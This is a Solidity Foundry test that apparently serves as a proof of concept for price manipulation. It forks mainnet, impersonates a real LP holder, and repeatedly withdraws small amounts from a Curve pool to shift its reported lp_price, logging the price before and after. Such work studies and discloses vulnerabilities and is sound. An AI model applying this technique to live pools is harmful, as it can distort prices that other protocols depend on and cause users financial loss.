// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;

import "forge-std/Test.sol";
import "forge-std/interfaces/IERC20.sol";

import "../contracts/ICurveCryptoSwap.sol";

contract PriceManipulationTest is Test {
    uint256 public constant START_BLOCK_NUMBER = 17318649;
    address public constant CALLER = 0x35E55a4227160D4d4f1b1732318d5062f348b354;
    // Who has 82 lp tokens.

    ICurveCryptoSwap public pool;

    function setUp() public {
        uint256 testnetFork = vm.createFork("NODE_URL");
        vm.selectFork(testnetFork);
        vm.rollFork(START_BLOCK_NUMBER);
        assertEq(vm.activeFork(), testnetFork);
        assertEq(block.number, START_BLOCK_NUMBER);

        pool = ICurveCryptoSwap(0x9409280DC1e6D33AB7A8C6EC03e5763FB61772B5);
        // LIDO-ETH Pool
    }

    function test1() public {
        uint256 originalLpPrice = pool.lp_price();
        vm.startPrank(CALLER);
        IERC20 poolToken = IERC20(pool.token());

        uint256 originalBalance = poolToken.balanceOf(CALLER);
        uint256 blockNumber = block.number;
        uint256 blockTimestamp = block.timestamp;

        // Remove a small amount every 8 blocks, 10 times.
        for (uint256 i = 0; i < 10; ++i) {
            vm.roll(blockNumber + i * 8);
            vm.warp(blockTimestamp + i * 8 * 15);
            pool.remove_liquidity_one_coin(2 * 10 ** 5, 1, 0);
        }
        vm.stopPrank();
        uint256 manipulatedLpPrice = pool.lp_price();
        uint256 usedBalance = originalBalance - poolToken.balanceOf(CALLER);
        console.log("originalLpPrice   :", originalLpPrice);
        console.log("manipulatedLpPrice:", manipulatedLpPrice);
        console.log("used lp amount    :", usedBalance);
    }
}